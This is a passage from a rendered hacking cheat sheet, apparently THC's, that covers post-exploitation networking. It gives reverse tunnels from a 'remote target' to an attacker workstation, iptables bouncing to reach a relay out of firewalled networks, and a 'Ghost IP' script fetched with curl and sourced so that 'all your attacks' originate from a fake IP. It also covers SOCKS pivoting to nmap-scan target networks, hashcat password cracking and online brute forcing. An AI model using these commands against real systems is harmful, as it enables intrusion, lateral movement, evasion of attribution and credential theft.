</span><span id="__span-40-2"><a id="__codelineno-40-2" name="__codelineno-40-2" href="#__codelineno-40-2"></a>bore<span class="w"> </span><span class="nb">local</span><span class="w"> </span><span class="m">31337</span><span class="w"> </span>--to<span class="w"> </span>bore.pub
</span></code></pre></div></p>
<p>using <a href="https://serveo.net">serveo.net</a> (free):
<div class="language-sh highlight"><pre><span></span><code><span id="__span-41-1"><a id="__codelineno-41-1" name="__codelineno-41-1" href="#__codelineno-41-1"></a><span class="c1"># Forward a random public TCP port to localhost:31337</span>
</span><span id="__span-41-2"><a id="__codelineno-41-2" name="__codelineno-41-2" href="#__codelineno-41-2"></a>ssh<span class="w"> </span>-R<span class="w"> </span><span class="m">0</span>:localhost:31337<span class="w"> </span>serveo.net
</span></code></pre></div></p>
<p>See also <a href="#revese-shell-remote-moe">remote.moe</a> (free) to forward raw TCP from the target to your workstation or <a href="https://ngrok.com/">ngrok</a> (paid subscription) to forward a raw public TCP port.</p>
<p>Other free services are limited to forward HTTPS only (not raw TCP). Some tricks below show how to tunnel raw TCP over HTTPS forwards (using websockets).</p>
<hr />
<p><a id="https"></a>
<strong>3.iii.b HTTPS reverse tunnels</strong></p>
<p>On the server, use any one of these three HTTPS tunneling services:<br />
<div class="language-sh highlight"><pre><span></span><code><span id="__span-42-1"><a id="__codelineno-42-1" name="__codelineno-42-1" href="#__codelineno-42-1"></a><span class="c1">### Reverse HTTPS tunnel to forward public HTTPS requests to this server&#39;s port 8080:</span>
</span><span id="__span-42-2"><a id="__codelineno-42-2" name="__codelineno-42-2" href="#__codelineno-42-2"></a>ssh<span class="w"> </span>-R80:0:8080<span class="w"> </span>-o<span class="w"> </span><span class="nv">StrictHostKeyChecking</span><span class="o">=</span>accept-new<span class="w"> </span>nokey@localhost.run
</span><span id="__span-42-3"><a id="__codelineno-42-3" name="__codelineno-42-3" href="#__codelineno-42-3"></a><span class="c1">### Or using remote.moe</span>
</span><span id="__span-42-4"><a id="__codelineno-42-4" name="__codelineno-42-4" href="#__codelineno-42-4"></a>ssh<span class="w"> </span>-R80:0:8080<span class="w"> </span>-o<span class="w"> </span><span class="nv">StrictHostKeyChecking</span><span class="o">=</span>accept-new<span class="w"> </span>nokey@remote.moe
</span><span id="__span-42-5"><a id="__codelineno-42-5" name="__codelineno-42-5" href="#__codelineno-42-5"></a><span class="c1">### Or using cloudflared</span>
</span><span id="__span-42-6"><a id="__codelineno-42-6" name="__codelineno-42-6" href="#__codelineno-42-6"></a>curl<span class="w"> </span>-fL<span class="w"> </span>-o<span class="w"> </span>cloudflared<span class="w"> </span>https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64
</span><span id="__span-42-7"><a id="__codelineno-42-7" name="__codelineno-42-7" href="#__codelineno-42-7"></a>chmod<span class="w"> </span><span class="m">755</span><span class="w"> </span>cloudflared
</span><span id="__span-42-8"><a id="__codelineno-42-8" name="__codelineno-42-8" href="#__codelineno-42-8"></a>cloudflared<span class="w"> </span>tunnel<span class="w"> </span>--url<span class="w"> </span>http://localhost:8080<span class="w"> </span>--no-autoupdate
</span></code></pre></div>
Either service will generate a new temporary HTTPS-URL for you to use.  </p>
<p>Then, use <a href="https://github.com/vi/websocat">websocat</a> or <a href="https://iq.thc.org/tunnel-via-cloudflare-to-any-tcp-service">Gost</a> on both ends to tunnel raw TCP over the HTTPS URL:</p>
<p>A. A simple STDIN/STDOUT pipe via HTTPS:
<div class="language-sh highlight"><pre><span></span><code><span id="__span-43-1"><a id="__codelineno-43-1" name="__codelineno-43-1" href="#__codelineno-43-1"></a><span class="c1">### On the server convert WebSocket to raw TCP:</span>
</span><span id="__span-43-2"><a id="__codelineno-43-2" name="__codelineno-43-2" href="#__codelineno-43-2"></a>websocat<span class="w"> </span>-s<span class="w"> </span><span class="m">8080</span>
</span></code></pre></div>
<div class="language-sh highlight"><pre><span></span><code><span id="__span-44-1"><a id="__codelineno-44-1" name="__codelineno-44-1" href="#__codelineno-44-1"></a><span class="c1">### On the remote target forward stdin/stdout to WebSocket:</span>
</span><span id="__span-44-2"><a id="__codelineno-44-2" name="__codelineno-44-2" href="#__codelineno-44-2"></a>websocat<span class="w"> </span>wss://&lt;HTTPS-URL&gt;
</span></code></pre></div></p>
<p>B. Forward raw TCP via HTTPS:
<div class="language-sh highlight"><pre><span></span><code><span id="__span-45-1"><a id="__codelineno-45-1" name="__codelineno-45-1" href="#__codelineno-45-1"></a><span class="c1">### On the server: Gost will translate any HTTP-websocket request to a TCP socks5 request:</span>
</span><span id="__span-45-2"><a id="__codelineno-45-2" name="__codelineno-45-2" href="#__codelineno-45-2"></a>gost<span class="w"> </span>-L<span class="w"> </span>mws://:8080
</span></code></pre></div></p>
<p>Forward port 2222 to the server's port 22.
<div class="language-sh highlight"><pre><span></span><code><span id="__span-46-1"><a id="__codelineno-46-1" name="__codelineno-46-1" href="#__codelineno-46-1"></a><span class="c1">### On the workstation:</span>
</span><span id="__span-46-2"><a id="__codelineno-46-2" name="__codelineno-46-2" href="#__codelineno-46-2"></a>gost<span class="w"> </span>-L<span class="w"> </span>tcp://:2222/127.0.0.1:22<span class="w"> </span>-F<span class="w"> </span><span class="s1">&#39;mwss://&lt;HTTPS-URL&gt;:443&#39;</span>
</span><span id="__span-46-3"><a id="__codelineno-46-3" name="__codelineno-46-3" href="#__codelineno-46-3"></a><span class="c1">### Test the connection (will connect to localhost:22 on the server)</span>
</span><span id="__span-46-4"><a id="__codelineno-46-4" name="__codelineno-46-4" href="#__codelineno-46-4"></a>nc<span class="w"> </span>-vn<span class="w"> </span><span class="m">127</span>.0.0.1<span class="w"> </span><span class="m">2222</span>
</span></code></pre></div>
or use the server as a Socks-Proxy EXIT node (e.g. access any host inside the server's network or even the Internet via the server (using the HTTPS reverse tunnel from above):
<div class="language-sh highlight"><pre><span></span><code><span id="__span-47-1"><a id="__codelineno-47-1" name="__codelineno-47-1" href="#__codelineno-47-1"></a><span class="c1">### On the workstation:</span>
</span><span id="__span-47-2"><a id="__codelineno-47-2" name="__codelineno-47-2" href="#__codelineno-47-2"></a>gost<span class="w"> </span>-L<span class="w"> </span>:1080<span class="w"> </span>-F<span class="w"> </span><span class="s1">&#39;mwss://&lt;HTTPS-URL&gt;:443&#39;</span>
</span><span id="__span-47-3"><a id="__codelineno-47-3" name="__codelineno-47-3" href="#__codelineno-47-3"></a><span class="c1">### Test the Socks-proxy:</span>
</span><span id="__span-47-4"><a id="__codelineno-47-4" name="__codelineno-47-4" href="#__codelineno-47-4"></a>curl<span class="w"> </span>-x<span class="w"> </span>socks5h://0<span class="w"> </span>ipinfo.io
</span></code></pre></div></p>
<p>More: <a href="https://github.com/twelvesec/port-forwarding">https://github.com/twelvesec/port-forwarding</a> and <a href="https://iq.thc.org/tunnel-via-cloudflare-to-any-tcp-service">Tunnel via Cloudflare to any TCP Service</a> and <a href="https://github.com/anderspitman/awesome-tunneling">Awesome Tunneling</a>.</p>
<hr />
<p><a id="iptables"></a>
<strong>3.iii.c Bouncing traffic with iptables</strong></p>
<p>Use the host 192.168.0.100 as a Jump-Host: Forward any connection from anywhere to 192.168.0.100:53 onwards to 1.2.3.4:443.
<div class="language-sh highlight"><pre><span></span><code><span id="__span-48-1"><a id="__codelineno-48-1" name="__codelineno-48-1" href="#__codelineno-48-1"></a><span class="nv">FPORT</span><span class="o">=</span><span class="m">53</span>
</span><span id="__span-48-2"><a id="__codelineno-48-2" name="__codelineno-48-2" href="#__codelineno-48-2"></a><span class="nv">DSTIP</span><span class="o">=</span><span class="m">1</span>.2.3.4
</span><span id="__span-48-3"><a id="__codelineno-48-3" name="__codelineno-48-3" href="#__codelineno-48-3"></a><span class="nv">DPORT</span><span class="o">=</span><span class="m">443</span>
</span><span id="__span-48-4"><a id="__codelineno-48-4" name="__codelineno-48-4" href="#__codelineno-48-4"></a><span class="nb">echo</span><span class="w"> </span><span class="m">1</span><span class="w"> </span>&gt;/proc/sys/net/ipv4/ip_forward
</span><span id="__span-48-5"><a id="__codelineno-48-5" name="__codelineno-48-5" href="#__codelineno-48-5"></a>
</span><span id="__span-48-6"><a id="__codelineno-48-6" name="__codelineno-48-6" href="#__codelineno-48-6"></a>iptables<span class="w"> </span>-t<span class="w"> </span>mangle<span class="w"> </span>-C<span class="w"> </span>PREROUTING<span class="w"> </span>-j<span class="w"> </span>CONNMARK<span class="w"> </span>--restore-mark<span class="w"> </span><span class="o">||</span><span class="w"> </span>iptables<span class="w"> </span>-t<span class="w"> </span>mangle<span class="w"> </span>-I<span class="w"> </span>PREROUTING<span class="w"> </span>-j<span class="w"> </span>CONNMARK<span class="w"> </span>--restore-mark
</span><span id="__span-48-7"><a id="__codelineno-48-7" name="__codelineno-48-7" href="#__codelineno-48-7"></a>iptables<span class="w"> </span>-t<span class="w"> </span>mangle<span class="w"> </span>-A<span class="w"> </span>PREROUTING<span class="w"> </span>-p<span class="w"> </span>tcp<span class="w"> </span>--dport<span class="w"> </span><span class="si">${</span><span class="nv">FPORT</span><span class="p">:?</span><span class="si">}</span><span class="w"> </span>-m<span class="w"> </span>addrtype<span class="w"> </span>--dst-type<span class="w"> </span>LOCAL<span class="w"> </span>-j<span class="w"> </span>MARK<span class="w"> </span>--set-mark<span class="w"> </span><span class="m">1188</span><span class="w"> </span>
</span><span id="__span-48-8"><a id="__codelineno-48-8" name="__codelineno-48-8" href="#__codelineno-48-8"></a>
</span><span id="__span-48-9"><a id="__codelineno-48-9" name="__codelineno-48-9" href="#__codelineno-48-9"></a>iptables<span class="w"> </span>-t<span class="w"> </span>nat<span class="w"> </span>-I<span class="w"> </span>PREROUTING<span class="w"> </span>-p<span class="w"> </span>tcp<span class="w"> </span>-m<span class="w"> </span>mark<span class="w"> </span>--mark<span class="w"> </span><span class="m">1188</span><span class="w"> </span>-j<span class="w"> </span>DNAT<span class="w"> </span>--to<span class="w"> </span><span class="si">${</span><span class="nv">DSTIP</span><span class="p">:?</span><span class="si">}</span>:<span class="si">${</span><span class="nv">DPORT</span><span class="p">:?</span><span class="si">}</span>
</span><span id="__span-48-10"><a id="__codelineno-48-10" name="__codelineno-48-10" href="#__codelineno-48-10"></a>iptables<span class="w"> </span>-I<span class="w"> </span>FORWARD<span class="w"> </span>-m<span class="w"> </span>mark<span class="w"> </span>--mark<span class="w"> </span><span class="m">1188</span><span class="w"> </span>-j<span class="w"> </span>ACCEPT
</span><span id="__span-48-11"><a id="__codelineno-48-11" name="__codelineno-48-11" href="#__codelineno-48-11"></a>
</span><span id="__span-48-12"><a id="__codelineno-48-12" name="__codelineno-48-12" href="#__codelineno-48-12"></a>iptables<span class="w"> </span>-t<span class="w"> </span>nat<span class="w"> </span>-I<span class="w"> </span>POSTROUTING<span class="w"> </span>-m<span class="w"> </span>mark<span class="w"> </span>--mark<span class="w"> </span><span class="m">1188</span><span class="w"> </span>-j<span class="w"> </span>MASQUERADE
</span><span id="__span-48-13"><a id="__codelineno-48-13" name="__codelineno-48-13" href="#__codelineno-48-13"></a>iptables<span class="w"> </span>-t<span class="w"> </span>nat<span class="w"> </span>-I<span class="w"> </span>POSTROUTING<span class="w"> </span>-m<span class="w"> </span>mark<span class="w"> </span>--mark<span class="w"> </span><span class="m">1188</span><span class="w"> </span>-j<span class="w"> </span>CONNMARK<span class="w"> </span>--save-mark
</span></code></pre></div></p>
<p>We use this trick to reach the gsocket-relay-network (or TOR) from deep inside firewalled networks.
<div class="language-sh highlight"><pre><span></span><code><span id="__span-49-1"><a id="__codelineno-49-1" name="__codelineno-49-1" href="#__codelineno-49-1"></a><span class="c1"># Deploy on a target that can only reach 192.168.0.100  </span>
</span><span id="__span-49-2"><a id="__codelineno-49-2" name="__codelineno-49-2" href="#__codelineno-49-2"></a><span class="nv">GS_HOST</span><span class="o">=</span><span class="m">192</span>.168.0.100<span class="w"> </span><span class="nv">GS_PORT</span><span class="o">=</span><span class="m">53</span><span class="w"> </span>./deploy.sh<span class="w">  </span>
</span></code></pre></div>
<div class="language-sh highlight"><pre><span></span><code><span id="__span-50-1"><a id="__codelineno-50-1" name="__codelineno-50-1" href="#__codelineno-50-1"></a><span class="c1"># Access the target  </span>
</span><span id="__span-50-2"><a id="__codelineno-50-2" name="__codelineno-50-2" href="#__codelineno-50-2"></a><span class="nv">GS_HOST</span><span class="o">=</span><span class="m">1</span>.2.3.4:<span class="w"> </span><span class="nv">GS_PORT</span><span class="o">=</span><span class="m">443</span><span class="w"> </span>gs-netcat<span class="w"> </span>-i<span class="w"> </span>-s<span class="w"> </span>...
</span></code></pre></div></p>
<hr />
<p><a id="ghost"></a>
<strong>3.vi.c Ghsot IP / IP Spoofing</strong></p>
<p>Useful on a host inside the target network. This tool re-configured (without trace) the SHELL: Any programm (nmap, cme, ...) started from this SHELL will use a fake IP. All your attacks will originate from a host that does not exist.</p>
<div class="language-sh highlight"><pre><span></span><code><span id="__span-51-1"><a id="__codelineno-51-1" name="__codelineno-51-1" href="#__codelineno-51-1"></a><span class="nb">source</span><span class="w"> </span>&lt;<span class="o">(</span>curl<span class="w"> </span>-fsSL<span class="w"> </span>https://github.com/hackerschoice/thc-tips-tricks-hacks-cheat-sheet/raw/master/tools/ghostip.sh<span class="o">)</span>
</span></code></pre></div>
<p>This also works in combination with:
 * <a href="https://thc.org/segfault/wireguard">Segfault's ROOT Servers</a>: Will connect your ROOT Server to the TARGET NETWORK and using a Ghost IP inside the taget network.
 * <a href="https://securelist.com/network-tunneling-with-qemu/111803/">QEMU Tunnels</a>: As above, but less secure.</p>
<hr />
<p><a id="scan-proxy"></a>
<strong>3.iv. Use any tool via Socks Proxy</strong></p>
<h3 id="create-a-tunnel-from-the-target-to-your-workstation-using-gsocket">Create a tunnel from the target to your workstation using gsocket:</h3>
<p>On the target's network:
<div class="language-sh highlight"><pre><span></span><code><span id="__span-52-1"><a id="__codelineno-52-1" name="__codelineno-52-1" href="#__codelineno-52-1"></a><span class="c1">## Create a SOCKS proxy into the target&#39;s network.</span>
</span><span id="__span-52-2"><a id="__codelineno-52-2" name="__codelineno-52-2" href="#__codelineno-52-2"></a><span class="c1">## Use gs-netcat but ssh -D would work as well.</span>
</span><span id="__span-52-3"><a id="__codelineno-52-3" name="__codelineno-52-3" href="#__codelineno-52-3"></a>gs-netcat<span class="w"> </span>-l<span class="w"> </span>-S
</span></code></pre></div></p>
<p>On your workstation:
<div class="language-sh highlight"><pre><span></span><code><span id="__span-53-1"><a id="__codelineno-53-1" name="__codelineno-53-1" href="#__codelineno-53-1"></a><span class="c1">## Create a gsocket tunnel into the target&#39;s network:</span>
</span><span id="__span-53-2"><a id="__codelineno-53-2" name="__codelineno-53-2" href="#__codelineno-53-2"></a>gs-netcat<span class="w"> </span>-p<span class="w"> </span><span class="m">1080</span>
</span></code></pre></div></p>
<h3 id="using-proxychain">Using ProxyChain:</h3>
<div class="language-sh highlight"><pre><span></span><code><span id="__span-54-1"><a id="__codelineno-54-1" name="__codelineno-54-1" href="#__codelineno-54-1"></a><span class="c1">## Use ProxyChain to access any host on the target&#39;s network: </span>
</span><span id="__span-54-2"><a id="__codelineno-54-2" name="__codelineno-54-2" href="#__codelineno-54-2"></a><span class="nb">echo</span><span class="w"> </span>-e<span class="w"> </span><span class="s2">&quot;[ProxyList]\nsocks5 127.0.0.1 1080&quot;</span><span class="w"> </span>&gt;pc.conf
</span><span id="__span-54-3"><a id="__codelineno-54-3" name="__codelineno-54-3" href="#__codelineno-54-3"></a>proxychains<span class="w"> </span>-f<span class="w"> </span>pc.conf<span class="w"> </span>-q<span class="w"> </span>curl<span class="w"> </span>ipinfo.io
</span><span id="__span-54-4"><a id="__codelineno-54-4" name="__codelineno-54-4" href="#__codelineno-54-4"></a><span class="c1">## Scan the router at 192.168.1.1</span>
</span><span id="__span-54-5"><a id="__codelineno-54-5" name="__codelineno-54-5" href="#__codelineno-54-5"></a>proxychains<span class="w"> </span>-f<span class="w"> </span>pc.conf<span class="w"> </span>-q<span class="w"> </span>nmap<span class="w"> </span>-n<span class="w"> </span>-Pn<span class="w"> </span>-sV<span class="w"> </span>-F<span class="w"> </span>--open<span class="w"> </span><span class="m">192</span>.168.1.1
</span><span id="__span-54-6"><a id="__codelineno-54-6" name="__codelineno-54-6" href="#__codelineno-54-6"></a><span class="c1">## Start 10 nmaps in parallel:</span>
</span><span id="__span-54-7"><a id="__codelineno-54-7" name="__codelineno-54-7" href="#__codelineno-54-7"></a>seq<span class="w"> </span><span class="m">1</span><span class="w"> </span><span class="m">254</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>xargs<span class="w"> </span>-P10<span class="w"> </span>-I<span class="o">{}</span><span class="w"> </span>proxychains<span class="w"> </span>-f<span class="w"> </span>pc.conf<span class="w"> </span>-q<span class="w"> </span>nmap<span class="w"> </span>-n<span class="w"> </span>-Pn<span class="w"> </span>-sV<span class="w"> </span>-F<span class="w"> </span>--open<span class="w"> </span><span class="m">192</span>.168.1.<span class="o">{}</span><span class="w"> </span>
</span></code></pre></div>
<h3 id="using-graftcp">Using GrafTCP:</h3>
<div class="language-sh highlight"><pre><span></span><code><span id="__span-55-1"><a id="__codelineno-55-1" name="__codelineno-55-1" href="#__codelineno-55-1"></a><span class="c1">## Use graftcp to access any host on the target&#39;s network:</span>
</span><span id="__span-55-2"><a id="__codelineno-55-2" name="__codelineno-55-2" href="#__codelineno-55-2"></a><span class="o">(</span>graftcp-local<span class="w"> </span>-select_proxy_mode<span class="w"> </span>only_socks5<span class="w"> </span><span class="p">&amp;</span><span class="o">)</span>
</span><span id="__span-55-3"><a id="__codelineno-55-3" name="__codelineno-55-3" href="#__codelineno-55-3"></a>graftcp<span class="w"> </span>curl<span class="w"> </span>ipinfo.io
</span><span id="__span-55-4"><a id="__codelineno-55-4" name="__codelineno-55-4" href="#__codelineno-55-4"></a>graftcp<span class="w"> </span>ssh<span class="w"> </span>root@192.168.1.1
</span><span id="__span-55-5"><a id="__codelineno-55-5" name="__codelineno-55-5" href="#__codelineno-55-5"></a>graftcp<span class="w"> </span>nmap<span class="w"> </span>-n<span class="w"> </span>-Pn<span class="w"> </span>-sV<span class="w"> </span>-F<span class="w"> </span>--open<span class="w"> </span><span class="m">19</span>.168.1.1
</span></code></pre></div>
<hr />
<p><a id="your-ip"></a>
<strong>3.v. Find your public IP address</strong></p>
<div class="language-sh highlight"><pre><span></span><code><span id="__span-56-1"><a id="__codelineno-56-1" name="__codelineno-56-1" href="#__codelineno-56-1"></a>curl<span class="w"> </span>-s<span class="w"> </span>wtfismyip.com/json<span class="w"> </span><span class="p">|</span><span class="w"> </span>jq
</span><span id="__span-56-2"><a id="__codelineno-56-2" name="__codelineno-56-2" href="#__codelineno-56-2"></a>curl<span class="w"> </span>ifconfig.me
</span><span id="__span-56-3"><a id="__codelineno-56-3" name="__codelineno-56-3" href="#__codelineno-56-3"></a>dig<span class="w"> </span>+short<span class="w"> </span>myip.opendns.com<span class="w"> </span>@resolver1.opendns.com
</span><span id="__span-56-4"><a id="__codelineno-56-4" name="__codelineno-56-4" href="#__codelineno-56-4"></a>host<span class="w"> </span>myip.opendns.com<span class="w"> </span>resolver1.opendns.com
</span></code></pre></div>
<p>Get geolocation information about any IP address:</p>
<div class="language-sh highlight"><pre><span></span><code><span id="__span-57-1"><a id="__codelineno-57-1" name="__codelineno-57-1" href="#__codelineno-57-1"></a>curl<span class="w"> </span>https://ipinfo.io/8.8.8.8<span class="w"> </span><span class="p">|</span><span class="w"> </span>jq
</span><span id="__span-57-2"><a id="__codelineno-57-2" name="__codelineno-57-2" href="#__codelineno-57-2"></a>curl<span class="w"> </span>http://ip-api.com/8.8.8.8
</span><span id="__span-57-3"><a id="__codelineno-57-3" name="__codelineno-57-3" href="#__codelineno-57-3"></a>curl<span class="w"> </span>https://cli.fyi/8.8.8.8
</span></code></pre></div>
<p>Get ASN information by IP address:</p>
<div class="language-sh highlight"><pre><span></span><code><span id="__span-58-1"><a id="__codelineno-58-1" name="__codelineno-58-1" href="#__codelineno-58-1"></a>asn<span class="o">()</span><span class="w"> </span><span class="o">{</span>
</span><span id="__span-58-2"><a id="__codelineno-58-2" name="__codelineno-58-2" href="#__codelineno-58-2"></a><span class="w">  </span><span class="o">[[</span><span class="w"> </span>-n<span class="w"> </span><span class="nv">$1</span><span class="w"> </span><span class="o">]]</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="o">{</span><span class="w"> </span><span class="nb">echo</span><span class="w"> </span>-e<span class="w"> </span><span class="s2">&quot;begin\nverbose\n</span><span class="si">${</span><span class="nv">1</span><span class="si">}</span><span class="s2">\nend&quot;</span><span class="p">|</span>netcat<span class="w"> </span>whois.cymru.com<span class="w"> </span><span class="m">43</span><span class="p">|</span><span class="w"> </span>tail<span class="w"> </span>-n<span class="w"> </span>+2<span class="p">;</span><span class="w"> </span><span class="k">return</span><span class="p">;</span><span class="w"> </span><span class="o">}</span>
</span><span id="__span-58-3"><a id="__codelineno-58-3" name="__codelineno-58-3" href="#__codelineno-58-3"></a><span class="w">  </span><span class="o">(</span><span class="nb">echo</span><span class="w"> </span>-e<span class="w"> </span><span class="s1">&#39;begin\nverbose&#39;</span><span class="p">;</span>cat<span class="w"> </span>-<span class="p">;</span><span class="nb">echo</span><span class="w"> </span>end<span class="o">)</span><span class="p">|</span>netcat<span class="w"> </span>whois.cymru.com<span class="w"> </span><span class="m">43</span><span class="p">|</span>tail<span class="w"> </span>-n<span class="w"> </span>+2
</span><span id="__span-58-4"><a id="__codelineno-58-4" name="__codelineno-58-4" href="#__codelineno-58-4"></a><span class="o">}</span>
</span><span id="__span-58-5"><a id="__codelineno-58-5" name="__codelineno-58-5" href="#__codelineno-58-5"></a>asn<span class="w"> </span><span class="m">1</span>.1.1.1<span class="w">           </span><span class="c1"># Single IP Lookup</span>
</span><span id="__span-58-6"><a id="__codelineno-58-6" name="__codelineno-58-6" href="#__codelineno-58-6"></a>cat<span class="w"> </span>IPS.txt<span class="w"> </span><span class="p">|</span><span class="w"> </span>asn<span class="w">     </span><span class="c1"># Bulk Lookup</span>
</span></code></pre></div>
<p>Check if TOR is working:</p>
<div class="language-sh highlight"><pre><span></span><code><span id="__span-59-1"><a id="__codelineno-59-1" name="__codelineno-59-1" href="#__codelineno-59-1"></a>curl<span class="w"> </span>-x<span class="w"> </span>socks5h://localhost:9050<span class="w"> </span>-s<span class="w"> </span>https://check.torproject.org/api/ip
</span><span id="__span-59-2"><a id="__codelineno-59-2" name="__codelineno-59-2" href="#__codelineno-59-2"></a><span class="c1">### Result should be {&quot;IsTor&quot;:true...</span>
</span></code></pre></div>
<hr />
<p><a id="check-reachable"></a>
<strong>3.vi. Check reachability from around the world</strong></p>
<p>The fine people at <a href="https://ping.pe/">https://ping.pe/</a> let you ping/traceroute/mtr/dig/port-check a host from around the world, check TCP ports, resolve a domain name, ...and many other things.</p>
<p>To check how well your (current) host can reach Internet use <a href="https://ooni.org/support/ooni-probe-cli">OONI Probe</a>:
<div class="language-sh highlight"><pre><span></span><code><span id="__span-60-1"><a id="__codelineno-60-1" name="__codelineno-60-1" href="#__codelineno-60-1"></a>ooniprobe<span class="w"> </span>run<span class="w"> </span>im
</span><span id="__span-60-2"><a id="__codelineno-60-2" name="__codelineno-60-2" href="#__codelineno-60-2"></a>ooniprobe<span class="w"> </span>run<span class="w"> </span>websites
</span><span id="__span-60-3"><a id="__codelineno-60-3" name="__codelineno-60-3" href="#__codelineno-60-3"></a>ooniprobe<span class="w"> </span>list
</span><span id="__span-60-4"><a id="__codelineno-60-4" name="__codelineno-60-4" href="#__codelineno-60-4"></a>ooniprobe<span class="w"> </span>list<span class="w"> </span><span class="m">1</span>
</span></code></pre></div></p>
<hr />
<p><a id="check-open-ports"></a>
<strong>3.vii. Check/Scan Open Ports on an IP</strong></p>
<p><a href="https://search.censys.io/">Censys</a> or <a href="https://internetdb.shodan.io">Shodan</a> Port lookup service:
<div class="language-shell highlight"><pre><span></span><code><span id="__span-61-1"><a id="__codelineno-61-1" name="__codelineno-61-1" href="#__codelineno-61-1"></a>curl<span class="w"> </span>https://internetdb.shodan.io/1.1.1.1
</span></code></pre></div></p>
<p>Fast (-F) vulnerability scan
<div class="language-shell highlight"><pre><span></span><code><span id="__span-62-1"><a id="__codelineno-62-1" name="__codelineno-62-1" href="#__codelineno-62-1"></a><span class="c1"># Version gathering</span>
</span><span id="__span-62-2"><a id="__codelineno-62-2" name="__codelineno-62-2" href="#__codelineno-62-2"></a>nmap<span class="w"> </span>-sCV<span class="w"> </span>-F<span class="w"> </span>-Pn<span class="w"> </span>--min-rate<span class="w"> </span><span class="m">10000</span><span class="w"> </span>scanme.nmap.org
</span><span id="__span-62-3"><a id="__codelineno-62-3" name="__codelineno-62-3" href="#__codelineno-62-3"></a><span class="c1"># Vulns</span>
</span><span id="__span-62-4"><a id="__codelineno-62-4" name="__codelineno-62-4" href="#__codelineno-62-4"></a>nmap<span class="w"> </span>-A<span class="w"> </span>-F<span class="w"> </span>-Pn<span class="w"> </span>--min-rate<span class="w"> </span><span class="m">10000</span><span class="w"> </span>--script<span class="w"> </span>vulners.nse<span class="w"> </span>--script-timeout<span class="o">=</span>5s<span class="w"> </span>scanme.nmap.org
</span></code></pre></div></p>
<p>Using bash:
<div class="language-shell highlight"><pre><span></span><code><span id="__span-63-1"><a id="__codelineno-63-1" name="__codelineno-63-1" href="#__codelineno-63-1"></a>timeout<span class="w"> </span><span class="m">5</span><span class="w"> </span>bash<span class="w"> </span>-c<span class="w"> </span><span class="s2">&quot;&lt;/dev/tcp/1.2.3.4/31337&quot;</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="nb">echo</span><span class="w"> </span>OPEN<span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="nb">echo</span><span class="w"> </span>CLOSED
</span></code></pre></div></p>
<hr />
<p><a id="bruteforce"></a>
<strong>3.viii. Crack Password hashes</strong></p>
<ol>
<li><a href="https://ntlm.pw/">NTLM2password</a> to crack (lookup) NTLM passwords</li>
<li><a href="https://wpa-sec.stanev.org">wpa-sec</a> to crack (lookup) WPA PSK passwords</li>
</ol>
<p>HashCat is our go-to tool for everything else:
<div class="language-shell highlight"><pre><span></span><code><span id="__span-64-1"><a id="__codelineno-64-1" name="__codelineno-64-1" href="#__codelineno-64-1"></a>hashcat<span class="w"> </span>my-hash<span class="w"> </span>/usr/share/wordlists/rockyou.txt
</span></code></pre></div></p>
<p>Or using a <a href="https://github.com/sean-t-smith/Extreme_Breach_Masks/">10-days 7-16 char hashmask</a> on GPU:
<div class="language-sh highlight"><pre><span></span><code><span id="__span-65-1"><a id="__codelineno-65-1" name="__codelineno-65-1" href="#__codelineno-65-1"></a>curl<span class="w"> </span>-fsSL<span class="w"> </span>https://github.com/sean-t-smith/Extreme_Breach_Masks/raw/main/10%2010-days/10-days_7-16.hcmask<span class="w"> </span>-o<span class="w"> </span><span class="m">10</span>-days_7-16.hcmask
</span><span id="__span-65-2"><a id="__codelineno-65-2" name="__codelineno-65-2" href="#__codelineno-65-2"></a><span class="c1"># -d2 == Use GPU #2 only (device #2)</span>
</span><span id="__span-65-3"><a id="__codelineno-65-3" name="__codelineno-65-3" href="#__codelineno-65-3"></a><span class="c1"># -O  == Up to 50% faster but limits password length to &lt;= 15</span>
</span><span id="__span-65-4"><a id="__codelineno-65-4" name="__codelineno-65-4" href="#__codelineno-65-4"></a><span class="c1"># -w1 == workload low (-w3 == high)</span>
</span><span id="__span-65-5"><a id="__codelineno-65-5" name="__codelineno-65-5" href="#__codelineno-65-5"></a>nice<span class="w"> </span>-n<span class="w"> </span><span class="m">19</span><span class="w"> </span>hashcat<span class="w"> </span>-o<span class="w"> </span>cracked.txt<span class="w"> </span>my-hash.txt<span class="w"> </span>-w1<span class="w"> </span>-a3<span class="w"> </span><span class="m">10</span>-days_7-16.hcmask<span class="w"> </span>-O<span class="w"> </span>-d2
</span></code></pre></div>
Read the <a href="https://hashcat.net/wiki/doku.php?id=frequently_asked_questions">FAQ</a>.</p>
<p>Be aware that <code>$6$</code> hashes are SLOW. Even the <a href="https://github.com/sean-t-smith/Extreme_Breach_Masks/raw/main/01%20instant_1-minute/1-minute_7-16.hcmask">1-minute 7-16 char hashmask</a> would take many days on a 8xRTX4090 cluster to complete.</p>
<p>Rent a GPU-Cluster at <a href="https://www.vast.ai">vast.ai</a> and use <a href="https://hub.docker.com/r/dizcza/docker-hashcat">dizcza/docker-hashcat</a> (<a href="https://adamsvoboda.net/password-cracking-in-the-cloud-with-hashcat-vastai/">read more</a>).</p>
<p>Otherwise, use <a href="https://crackstation.net">Crackstation</a>, <a href="https://shuck.sh/">shuck.sh</a>, <a href="https://github.com/someshkar/colabcat">ColabCat/cloud</a>/<a href="https://github.com/JoelGMSec/Cloudtopolis">Cloudtopolis</a> or crack on your own <a href="https://akimbocore.com/article/hashcracking-with-aws/">AWS</a> instances.</p>
<p><strong>3.xi. Brute Force Passwords / Keys</strong></p>
<p>The following is for brute forcing (guessing) passwords of ONLINE SERVICES.</p>
<p><a id="gmail"></a></p>
<details>
  <summary>GMail Imbeciles - CLICK HERE</summary>

> You can not brute force GMAIL accounts.  
> SMTP AUTH/LOGIN IS DISABLED ON GMAIL.  
> All GMail Brute Force and Password Cracking tools are FAKE.
</details>

<p>All tools are pre-installed on segfault:
<div class="language-shell highlight"><pre><span></span><code><span id="__span-66-1"><a id="__codelineno-66-1" name="__codelineno-66-1" href="#__codelineno-66-1"></a>ssh<span class="w"> </span>root@segfaul.net<span class="w"> </span><span class="c1"># password is &#39;segfault&#39;</span>
</span></code></pre></div>
(You may want to use your <a href="https://www.thc.org/segfault/wireguard">own EXIT node</a>)</p>
<p>Tools:
* <a href="https://nmap.org/ncrack/man.html">Ncrack</a>
